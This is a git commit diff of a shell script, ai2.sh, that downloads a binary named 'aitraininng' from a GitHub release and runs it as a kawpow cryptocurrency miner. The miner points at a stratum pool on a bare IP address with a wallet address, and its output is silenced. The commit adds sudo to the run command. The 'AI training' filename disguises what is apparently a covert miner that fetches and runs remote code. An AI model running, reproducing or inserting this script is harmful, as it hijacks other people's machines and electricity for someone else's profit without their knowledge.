ea8176a735750776b5a4d42f07c9952029b9a4de
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-30 17:26:59 +0300

    Update ai2.sh

--- ai2.sh
+++ ai2.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
 chmod +x aitraininng
-./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch > /dev/null 2>&1
+sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch > /dev/null 2>&1
  
